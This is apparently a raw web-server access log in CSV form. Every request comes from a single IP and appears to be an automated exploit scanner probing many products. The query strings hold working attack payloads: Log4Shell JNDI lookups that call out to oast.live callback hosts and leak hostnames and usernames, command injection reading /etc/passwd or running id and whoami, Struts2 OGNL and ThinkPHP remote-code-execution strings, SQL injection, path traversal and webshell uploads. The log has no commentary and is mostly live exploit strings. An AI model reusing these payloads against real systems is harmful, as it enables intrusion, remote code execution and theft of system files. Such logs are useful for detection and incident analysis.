"uri","query_string","request_ip","method"
"/api/v1/database/4","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/runners/start","-","148.135.107.254","POST"
"/ccmadmin/j_security_check","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/solr/admin/cores","action=%2524%257Bjndi%253Aldap%253A%252F%252F%2524%257B%253A-470%257D%2524%257B%253A-488%7D%257D.%2524%257BhostName%257D.uri.cl82amo80ssu2h3kcjs091p6wyenzmx74.oast.live%252F%257D","148.135.107.254","GET"
"/suite-auth/login","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/plus/flink.php","dopost=save&c=cat%2520/etc/passwd","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/api/v1/database/4","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/users/sign_in","-","148.135.107.254","GET"
"/WebReport/ReportServer","op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/T0oCLE7p.jsp","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/api/v1/repos/search","limit=1","148.135.107.254","GET"
"/j_security_check","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/druid/coordinator/v1/lookups/config/$%257bjndi:ldap:%252f%252fcl82amo80ssu2h3kcjs0k5hrho1fuh51p.oast.live%252ftea%257d","-","148.135.107.254","DELETE"
"/showfile.php","file=/etc/passwd","148.135.107.254","GET"
"/api/v1/database/5","-","148.135.107.254","GET"
"/api/system/sessions","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/fsms/fsmsh.dll","FSMSCommand=$%7Bjndi:ldap://$%7B:-657%7D$%7B:-251%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0hr6gz7qkfab94.oast.live/r7vrv%7D","148.135.107.254","GET"
"/ocpu/library/base/R/do.call/json","-","148.135.107.254","POST"
"/jenkins/script","-","148.135.107.254","GET"
"/api/v1/database/5","-","148.135.107.254","GET"
"/_search","a=$%257Bjndi%253Aldap%253A%252F%252F$%257B%253A-505%257D$%257B%253A-347%257D.$%257BhostName%257D.search.cl82amo80ssu2h3kcjs03j4y9jwdouonm.oast.live%257D","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/script/","-","148.135.107.254","GET"
"/data/manage/cmd.php","cmd=id","148.135.107.254","GET"
"/mifs/j_spring_security_check","-","148.135.107.254","POST"
"/Upload/test/2Y3POARRKli4z9YhyN3XjNw40b3.php","-","148.135.107.254","GET"
"/api/system/deviceinfo","-","148.135.107.254","GET"
"/webmail/basic/","-","148.135.107.254","POST"
"/api/v1/database/6","-","148.135.107.254","GET"
"/api/geojson","url=$%7Bjndi:ldap://$%7B:-300%7D$%7B:-638%7D.$%7BhostName%7D.url.cl82amo80ssu2h3kcjs0ak1ymxtghaegg.oast.live%7D","148.135.107.254","GET"
"/v1/agent/service/register","-","148.135.107.254","PUT"
"/db_dump.php","-","148.135.107.254","GET"
"/v2/query","-","148.135.107.254","POST"
"/Upload/upload_file.php","l=test","148.135.107.254","POST"
"/flexnet/logon.do","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/plugin/customMethod","-","148.135.107.254","POST"
"/goanywhere/auth/Login.xhtml","-","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/cgi-bin/login.cgi","-","148.135.107.254","POST"
"/nacos/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/login/SAML","=$%7Bjndi:ldap://$%7B:-813%7D$%7B:-985%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0mjajuipahy5i1.oast.live/ni8wp%7D","148.135.107.254","GET"
"/Login","-","148.135.107.254","POST"
"/api/v1/database/6","-","148.135.107.254","GET"
"/api/logstash/pipeline/$%257Bjndi:ldap://$%257B:-992%257D$%257B:-240%257D.$%257BhostName%257D.username.cl82amo80ssu2h3kcjs0yrrjxhthcggmo.oast.live/NOTsC%257D","-","148.135.107.254","GET"
"/login","-","148.135.107.254","POST"
"/fpc/login/","-","148.135.107.254","POST"
"/http-bind","room=$%7Bjndi:ldap://$%7B:-156%7D$%7B:-734%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0f8jimdu8zewtr.oast.live/bCu6W%7D","148.135.107.254","GET"
"/sysShell","-","148.135.107.254","POST"
"/manager/radius/server_ping.php","ip=127.0.0.1%7Ccat%2520/etc/passwd%3E../../2Y3PO9kdbwooMYGliBpawFeQF9q.txt&id=1","148.135.107.254","GET"
"/2Y3PO9kdbwooMYGliBpawFeQF9q.txt","-","148.135.107.254","GET"
"/two_fact_auth","-","148.135.107.254","POST"
"/debug.php","-","148.135.107.254","POST"
"/AdminPage/conf/runCmd","cmd=id","148.135.107.254","GET"
"/lcms/index.php","-","148.135.107.254","POST"
"/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc","-","148.135.107.254","POST"
"/index.php","-","148.135.107.254","POST"
"/app","-","148.135.107.254","POST"
"/tool/log/c.php","strip_slashes=system&host=ipconfig","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/upgrade_handle.php","cmd=writeuploaddir&uploaddir=%2527;whoami;%2527","148.135.107.254","GET"
"/opennms/j_spring_security_check","-","148.135.107.254","POST"
"/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/prweb/","-","148.135.107.254","GET"
"/upload/UploadResourcePic.ashx","ResourceID=8382","148.135.107.254","POST"
"/j_security_check","-","148.135.107.254","POST"
"/index.php","s=weibo/Share/shareBox&query=app=Common%2526model=Schedule%2526method=runSchedule%2526id%5Bstatus%5D=1%2526id%5Bmethod%5D=Schedule-%253E_validationFieldItem%2526id%5B4%5D=function%2526%5B6%5D%5B%5D=%2526id%5B0%5D=cmd%2526id%5B1%5D=assert%2526id%5Bargs%5D=cmd=system(id)","148.135.107.254","GET"
"/directdata/direct/router","-","148.135.107.254","POST"
"/seeyon/main.do","method=login","148.135.107.254","POST"
"/api/sonicos/auth","-","148.135.107.254","POST"
"/v1/submissions","-","148.135.107.254","GET"
"/api/login","-","148.135.107.254","POST"
"/index.php","s=weibo/Share/shareBox&query=app=Common%2526model=Schedule%2526method=runSchedule%2526id%5Bstatus%5D=1%2526id%5Bmethod%5D=Schedule-%253E_validationFieldItem%2526id%5B4%5D=function%2526%5B6%5D%5B%5D=%2526id%5B0%5D=cmd%2526id%5B1%5D=assert%2526id%5Bargs%5D=cmd=system(ver)","148.135.107.254","GET"
"/data/pbootcms.db","-","148.135.107.254","GET"
"/en-US/account/login","-","148.135.107.254","POST"
"/2Y3POZN3TVwpcJDqmEkPTFoOt7W.txt","-","148.135.107.254","GET"
"/php/ping.php","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/ddi/server/upload/lmo32u.php","-","148.135.107.254","GET"
"/login/userverify.cgi","-","148.135.107.254","POST"
"/cgi-bin/Maintain/date_config","-","148.135.107.254","POST"
"/api/ping","count=5&host=;cat%2520/etc/passwd;&port=80&source=1.1.1.1&type=icmp","148.135.107.254","GET"
"/dr/authentication/oauth2/oauth2login","error=$%257Bjndi%253Aldap%253A%252F%252F$%257B%253A-452%257D$%257B%253A-272%257D.$%257BhostName%257D.uri.cl82amo80ssu2h3kcjs04k31ynei4wbbn.oast.live%257D","148.135.107.254","GET"
"/rest/domains/list","sortCol=fullyQualifiedName&sortDir=asc","148.135.107.254","GET"
"/mainfile.php","username=test&password=testpoc&_login=1&Logon=%2527%253Becho%2520md5(TestPoc)%253B%2527","148.135.107.254","GET"
"/login.php","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/","g=obj_app_upfile","148.135.107.254","POST"
"/zdm/cxf/login","-","148.135.107.254","POST"
"/api/user/reg","-","148.135.107.254","POST"
"/login.php","-","148.135.107.254","POST"
"/tool/log/c.php","strip_slashes=md5&host=2Y3PNsmtFrjifvGqSjeYuxJpskN","148.135.107.254","GET"
"/login.php","-","148.135.107.254","POST"
"/api/edr/sangforinter/v2/cssp/slog_client","token=eyJtZDUiOnRydWV9","148.135.107.254","POST"
"/rep/login","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/index.php","a=fetch&content=%253C%253Fphp+file_put_contents%2528%25222Y3POSvLIci5WOlwlXyY7O8rzbt.php%2522%252C%2522%253C%253Fphp+echo+phpinfo%2528%2529%253B%2522%2529%253B","148.135.107.254","GET"
"/seeyon/wpsAssistServlet","flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/s9gacY.jsp&fileId=2","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/zms/admin/index.php","-","148.135.107.254","POST"
"/ddi/server/fileupload.php","uploadDir=upload&name=lmo32u.php","148.135.107.254","POST"
"/seeyon/main.do","method=changeLocale","148.135.107.254","POST"
"/actuator/env","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/general/appbuilder/web/portal/gateway/getdata","activeTab=%25E5%2527%2519,1%253D%253Eeval(base64_decode(%2522ZWNobyBtZDUoOTk5OTk5OTk5KTs=%2522)))%253B/*&id=19&module=Carouselimage","148.135.107.254","GET"
"/api/v1/database/7","-","148.135.107.254","GET"
"/api/group/list","-","148.135.107.254","GET"
"/","s=index/index/index","148.135.107.254","POST"
"/2Y3POSvLIci5WOlwlXyY7O8rzbt.php","-","148.135.107.254","GET"
"/mobile/api/api.ali.php","-","148.135.107.254","POST"
"/attachements/dniFbB.php","-","148.135.107.254","GET"
"/index.php","s=/index/index/name/$%257B@phpinfo()%257D","148.135.107.254","GET"
"/mac/gateway.php","-","148.135.107.254","POST"
"/suite-api/api/auth/token/acquire","-","148.135.107.254","POST"
"/","s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1","148.135.107.254","GET"
"/index.php","s=captcha","148.135.107.254","POST"
"/module/ueditor/php/action_upload.php","action=uploadfile","148.135.107.254","POST"
"/view/IPV6/naborTable/static_convert.php","blocks%5B0%5D=%7C%7C%2520echo%2520%25272Y3POM3qxu2lPjI2JTFj4n6bYyt%2527%2520%253E%2520/var/www/html/config_application.txt%250a","148.135.107.254","GET"
"/hybridity/api/sessions","-","148.135.107.254","POST"
"/login","-","148.135.107.254","POST"
"/config_application.txt","-","148.135.107.254","GET"
"/api/v1/database/9","-","148.135.107.254","GET"
"/defaultroot/upload/fileUpload.controller","-","148.135.107.254","POST"
"/inc/package/work.php","id=../../../../../myoa/attach/approve_center/2311/%253E%253E%253E%253E%253E%253E%253E%253E%253E%253E%253E.fb6790f4","148.135.107.254","GET"
"/websso/SAML2/SSO/vsphere.local","SAMLRequest","148.135.107.254","GET"
"/api/v1/database/9","-","148.135.107.254","GET"
"/index.php","ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1","148.135.107.254","GET"
"/ispirit/interface/gateway.php","-","148.135.107.254","POST"
"/2Y3PNY1qVZAmQ7sRnsWxk1KX3qb.php","-","148.135.107.254","GET"
"/ui/login.action","-","148.135.107.254","POST"
"/defaultroot/officeserverservlet","-","148.135.107.254","GET"
"/2Y3POd1r9EK9gTS0FUuDGYRkjtM.php","-","148.135.107.254","GET"
"/client.do","-","148.135.107.254","POST"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","POST"
"/weaver/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/general/weibo/javascript/LazyUploadify/uploadify.php","-","148.135.107.254","GET"
"/general/weibo/javascript/uploadify/uploadify.php","-","148.135.107.254","GET"
"/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php","-","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction","action=image","148.135.107.254","POST"
"/eoffice10/server/public/iWebOffice2015/OfficeServer.php","-","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","GET"
"/general/weibo/javascript/LazyUploadify/uploadify.php","-","148.135.107.254","POST"
"/general/weibo/javascript/uploadify/uploadify.php","-","148.135.107.254","POST"
"/wp-admin/admin-post.php","swp_debug=load_options&swp_url=%3Cpre%3Esystem(%27cat","148.135.107.254","GET"
"/my-account/","alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=","148.135.107.254","GET"
"/UploadFileData","action=upload_file&filename=../2Y3POFFGcdh12vWsjTFqSXeEKhg.jsp","148.135.107.254","POST"
"/weaver/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/eoffice10/server/public/iWebOffice2015/Document/jormg.php","-","148.135.107.254","GET"
"/wp-content/plugins/simple-file-list/ee-upload-engine.php","-","148.135.107.254","POST"
"/wp-content/uploads/2Y3PNq904ZKFZlwSE6xbYVgt6TR.php","-","148.135.107.254","GET"
"/wp-content/plugins/simple-file-list/ee-file-engine.php","-","148.135.107.254","POST"
"/attachment/personal/_temp.php","-","148.135.107.254","GET"
"/ServiceDispatcherServlet","-","148.135.107.254","POST"
"/wp-content/uploads/simple-file-list/fibgegh.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/servlet/FileReceiveServlet","-","148.135.107.254","POST"
"/uapim/upload/grouptemplet","groupid=85&fileType=jsp","148.135.107.254","POST"
"/","alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=","148.135.107.254","GET"
"/ajax/getemaildata.php","DontCheckLogin=1","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/servlet/%7Ebaseapp/nc.message.bs.NCMessageServlet","-","148.135.107.254","POST"
"/api/v1/database/10","-","148.135.107.254","GET"
"/servlet/%7Ebaseapp/nc.message.bs.NCMessageServlet","-","148.135.107.254","POST"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/uapjs/jsinvoke/","action=invoke","148.135.107.254","POST"
"/cgi-bin/kerbynet","Section=NoAuthREQ&Action=x509List&type=*%2522;/root/kerbynet.cgi/scripts/getkey%2520../../../etc/passwd;%2522","148.135.107.254","GET"
"/admin/user.php","-","148.135.107.254","GET"
"/servlet/%7Eic/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/servlet/codesettree","flag=c&status=1&codesetid=1&parentid=-1&categories=%7E31%7E27%7E20union%7E20all%7E20select%7E20%7E27hongjing%7E27%7E2c%7E40%7E40version%7E2d%7E2d","148.135.107.254","GET"
"/axis2-admin/login","-","148.135.107.254","POST"
"/level/16/exec/show/config/CR","-","148.135.107.254","GET"
"/user.action","-","148.135.107.254","POST"
"/axis2/axis2-admin/login","-","148.135.107.254","POST"
"/","search==%2500%7B.cookie%7CLaLrcW%7Cvalue%253dCVE-2014-6287.%7D","148.135.107.254","GET"
"/webadmin/clientlogin/","srid&action=showdeny&url","148.135.107.254","GET"
"/index.action","redirect:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/images/logo/logo-eoffice.php","-","148.135.107.254","GET"
"/users/sign_in","-","148.135.107.254","GET"
"/webadmin/auth/verification.php","-","148.135.107.254","POST"
"/wlsecurity.html","-","148.135.107.254","GET"
"/horde/admin/user.php","-","148.135.107.254","GET"
"/webadm/","q=moni_detail.do&action=gragh","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/invoker/JMXInvokerServlet/","-","148.135.107.254","POST"
"/","author=1","148.135.107.254","GET"
"/login.action","redirect:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/boardDataWW.php","-","148.135.107.254","POST"
"/cgi-bin/stats","-","148.135.107.254","GET"
"/fileserver/2Y3POcokwbkbOedSmEwjrukxGrN.txt","-","148.135.107.254","PUT"
"/cgi-bin/status","-","148.135.107.254","GET"
"/services/getFile.cmd","userfile=config.xml","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/webadmin/script","command=%7C%2520nslookup%2520cl82amo80ssu2h3kcjs0gz8kjxjpw1e9u.oast.live","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/javax.faces.resource/dynamiccontent.properties.xhtml","-","148.135.107.254","POST"
"/rest/v1/AccountService/Accounts","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/_users/org.couchdb.user:poc","-","148.135.107.254","PUT"
"/fileserver/2Y3POcokwbkbOedSmEwjrukxGrN.txt","-","148.135.107.254","GET"
"/dumpmdm.cmd","-","148.135.107.254","GET"
"/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/solr/admin/cores","wt=json","148.135.107.254","GET"
"/index.action","action:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/invoker/readonly","-","148.135.107.254","POST"
"/","name=%2525%257B%2528%2523dm%253D%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%2529.%2528%2523_memberAccess%253F%2528%2523_memberAccess%253D%2523dm%2529%253A%2528%2528%2523container%253D%2523context%255B%2527com.opensymphony.xwork2.ActionContext.container%2527%255D%2529.%2528%2523ognlUtil%253D%2523container.getInstance%2528%2540com.opensymphony.xwork2.ognl.OgnlUtil%2540class%2529%2529.%2528%2523ognlUtil.getExcludedPackageNames%2528%2529.clear%2528%2529%2529.%2528%2523ognlUtil.getExcludedClasses%2528%2529.clear%2528%2529%2529.%2528%2523context.setMemberAccess%2528%2523dm%2529%2529%2529%2529.%2528%2523cmd%253D%2527cat%2520/etc/passwd%2527%2529.%2528%2523iswin%253D%2528%2540java.lang.System%2540getProperty%2528%2527os.name%2527%2529.toLowerCase%2528%2529.contains%2528%2527win%2527%2529%2529%2529.%2528%2523cmds%253D%2528%2523iswin%253F%257B%2527cmd.exe%2527%252C%2527/c%2527%252C%2523cmd%257D%253A%257B%2527/bin/bash%2527%252C%2527-c%2527%252C%2523cmd%257D%2529%2529.%2528%2523p%253Dnew%2520java.lang.ProcessBuilder%2528%2523cmds%2529%2529.%2528%2523p.redirectErrorStream%2528true%2529%2529.%2528%2523process%253D%2523p.start%2528%2529%2529.%2528%2540org.apache.commons.io.IOUtils%2540toString%2528%2523process.getInputStream%2528%2529%2529%2529%257D","148.135.107.254","POST"
"/integration/saveGangster.action","-","148.135.107.254","POST"
"/login.action","action:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/index.action","redirect%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/CMSInstall/install.aspx","-","148.135.107.254","GET"
"/cgi-bin/login","LD_DEBUG=files","148.135.107.254","GET"
"/invoker/EJBInvokerServlet/","-","148.135.107.254","POST"
"/cgi-bin/status/status.cgi","-","148.135.107.254","GET"
"/cgi-bin/test","-","148.135.107.254","GET"
"/cobbler_api","-","148.135.107.254","POST"
"/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
